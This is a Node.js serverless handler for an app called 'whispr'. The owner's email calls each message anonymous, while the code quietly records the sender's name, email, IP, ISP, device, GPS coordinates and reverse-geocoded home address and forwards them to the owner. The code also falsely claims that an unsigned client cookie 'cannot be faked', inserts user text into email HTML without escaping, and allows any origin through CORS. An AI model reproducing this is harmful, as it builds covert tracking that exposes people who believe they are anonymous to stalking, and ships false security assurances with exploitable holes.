const nodemailer = require('nodemailer');

// Parse cookie header string into a key/value object
function parseCookies(cookieHeader = '') {
  const cookies = {};
  cookieHeader.split(';').forEach(part => {
    const [k, ...v] = part.trim().split('=');
    if (k) cookies[k] = decodeURIComponent(v.join('='));
  });
  return cookies;
}

// IP → city/region/country/ISP fallback
async function getExtendedMetadata(ip) {
  if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') {
    return { city: 'Local', region: 'Local', country: 'Local', isp: 'Internal' };
  }
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await response.json();
    if (data.status === 'success') {
      return { city: data.city, region: data.regionName, country: data.country, isp: data.isp };
    }
  } catch (e) {
    console.error('Geo Lookup Error:', e);
  }
  return null;
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  // 1. READ GOOGLE USER FROM SERVER-SIDE COOKIE (cannot be faked by client)
  const cookies = parseCookies(req.headers.cookie);
  const gUserRaw = cookies['g_user'];

  if (!gUserRaw) return res.status(401).json({ error: 'Not authenticated' });

  // Cookie format: "Full Name (email@example.com)"
  let senderName = gUserRaw;
  let senderEmail = '';
  const match = gUserRaw.match(/^(.*)\s*\(([^)]+)\)\s*$/);
  if (match) {
    senderName = match[1].trim();
    senderEmail = match[2].trim();
  }

  const { message, coords } = req.body;
  if (!message) return res.status(400).json({ error: 'Missing message' });

  // 2. IP & NETWORK DETECTION
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
             req.headers['x-real-ip'] ||
             req.socket?.remoteAddress ||
             'Unknown';

  let city    = req.headers['x-vercel-ip-city'];
  let country = req.headers['x-vercel-ip-country'];
  let region  = req.headers['x-vercel-ip-region'];
  let isp     = 'Vercel Edge';

  if (!city || !country) {
    const extra = await getExtendedMetadata(ip);
    if (extra) { city = extra.city; country = extra.country; region = extra.region; isp = extra.isp; }
  }

  // 3. GPS & BARANGAY DETECTION (Nominatim Reverse Geocoding)
  let barangay    = 'GPS Access Blocked';
  let fullAddress = 'The sender did not allow location access.';
  let mapsLink    = '';

  if (coords && coords.lat && coords.lng) {
    try {
      const geoRes = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${coords.lat}&lon=${coords.lng}&zoom=18&addressdetails=1`,
        { headers: { 'User-Agent': 'WhisprApp/1.0' } }
      );
      const geoData = await geoRes.json();
      barangay    = geoData.address.suburb || geoData.address.village || geoData.address.neighbourhood || 'Found';
      fullAddress = geoData.display_name;
      mapsLink    = `https://www.google.com/maps?q=${coords.lat},${coords.lng}`;
    } catch (e) {
      console.error('GPS Reverse Lookup Error:', e);
    }
  }

  // 4. DEVICE DETECTION
  const ua         = req.headers['user-agent'] || '';
  const isIphone   = /iphone/i.test(ua);
  const isAndroid  = /android/i.test(ua);
  const isMobile   = /mobile/i.test(ua);
  const deviceType = isIphone ? 'iPhone' : isAndroid ? 'Android' : isMobile ? 'Mobile' : 'Desktop';

  const timestamp    = new Date().toISOString();
  const readableTime = new Date().toLocaleString('en-PH', { timeZone: 'Asia/Manila' });

  // 5. SAVE TO JSONBIN
  try {
    // Fetch current data
    const getResponse = await fetch(
      `https://api.jsonbin.io/v3/b/${process.env.JSONBIN_BIN_ID}`,
      {
        headers: {
          'X-Master-Key': process.env.JSONBIN_API_KEY
        }
      }
    );

    let alerts = [];
    if (getResponse.ok) {
      const data = await getResponse.json();
      alerts = data.record.alerts || [];
    }

    // Add new message
    const newAlert = {
      id: Date.now(),
      senderName,
      senderEmail,
      message,
      timestamp,
      city,
      region,
      country,
      isp,
      deviceType,
      ip,
      barangay,
      fullAddress,
      mapsLink,
      coords
    };

    alerts.unshift(newAlert); // Add to beginning
    alerts = alerts.slice(0, 100); // Keep only last 100

    // Save updated data back to JSONBin
    await fetch(
      `https://api.jsonbin.io/v3/b/${process.env.JSONBIN_BIN_ID}`,
      {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'X-Master-Key': process.env.JSONBIN_API_KEY
        },
        body: JSON.stringify({ alerts })
      }
    );

    console.log(`✅ Message saved to JSONBin — sender: ${senderName} <${senderEmail}>`);
  } catch (dbError) {
    console.error('JSONBin Error:', dbError.message);
  }

  // 6. SEND EMAIL
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: process.env.EMAIL_USER, pass: process.env.EMAIL_PASS },
    });

    await transporter.sendMail({
      from: `"whispr 👁" <${process.env.EMAIL_USER}>`,
      to: process.env.OWNER_EMAIL,
      subject: `🚨 New message from ${senderName}`,
      html: `
        <div style="font-family: sans-serif; max-width: 600px; border: 2px solid #e8176e; border-radius: 12px; padding: 20px; color: #333;">
          <h2 style="color: #e8176e; text-align: center; margin-top: 0;">New Anonymous Message!</h2>

          <div style="background: #fff0f5; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; margin-bottom: 25px; border-left: 5px solid #e8176e;">
            "${message}"
          </div>

          <!-- SENDER IDENTITY (Google) -->
          <div style="background: #fdf2f2; border: 1px solid #f8b4b4; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
            <h3 style="color: #c53030; margin-top: 0; font-size: 14px;">👤 VERIFIED SENDER IDENTITY</h3>
            <p style="margin: 5px 0; font-size: 16px;">
              <strong>Name:</strong>
              <span style="color: #e8176e; font-weight: bold;">${senderName}</span>
            </p>
            ${senderEmail ? `<p style="margin: 5px 0; font-size: 14px;"><strong>Email:</strong> <a href="mailto:${senderEmail}" style="color: #e8176e;">${senderEmail}</a></p>` : ''}
            <p style="margin: 5px 0; font-size: 12px; color: #888;">
              Verified via Google OAuth — this identity cannot be faked.
            </p>
          </div>

          <!-- GPS SECTION -->
          <div style="background: #fdf2f2; border: 1px solid #f8b4b4; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
            <h3 style="color: #c53030; margin-top: 0; font-size: 14px;">🛰 GPS DATA</h3>
            <p style="margin: 5px 0;"><strong>📍 Barangay/Area:</strong> <span style="color: #e8176e; font-size: 16px; font-weight: bold;">${barangay}</span></p>
            <p style="margin: 5px 0;"><strong>🏠 Address:</strong> ${fullAddress}</p>
            ${mapsLink ? `<p style="margin: 10px 0;"><a href="${mapsLink}" style="background: #e8176e; color: white; padding: 8px 15px; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block;">Open in Google Maps</a></p>` : ''}
            <p style="margin: 5px 0; font-size: 11px; color: #666;"><strong>Coordinates:</strong> ${coords ? `${coords.lat}, ${coords.lng}` : 'Access Denied'}</p>
          </div>

          <!-- NETWORK SECTION -->
          <h3 style="font-size: 14px; color: #555; border-bottom: 1px solid #eee; padding-bottom: 5px;">📱 SENDER NETWORK & DEVICE</h3>
          <table style="width: 100%; font-size: 13px; color: #444;">
            <tr><td style="padding: 4px 0;"><strong>IP Address:</strong></td><td>${ip}</td></tr>
            <tr><td style="padding: 4px 0;"><strong>Device:</strong></td><td>${deviceType}</td></tr>
            <tr><td style="padding: 4px 0;"><strong>Location:</strong></td><td>${city}, ${region}, ${country}</td></tr>
            <tr><td style="padding: 4px 0;"><strong>Provider:</strong></td><td>${isp}</td></tr>
            <tr><td style="padding: 4px 0;"><strong>Time (PH):</strong></td><td>${readableTime}</td></tr>
          </table>

          <p style="font-size: 10px; color: #bbb; margin-top: 25px; text-align: center; line-height: 1.4;">
            Advanced Geolocation System • Project Whispr<br>
            User Agent: ${ua}
          </p>
        </div>
      `,
    });
    console.log(`📧 Email sent — sender: ${senderName} <${senderEmail}>`);
  } catch (emailError) {
    console.error('📧 Email Error:', emailError.message);
  }

  return res.status(200).json({ ok: true });
};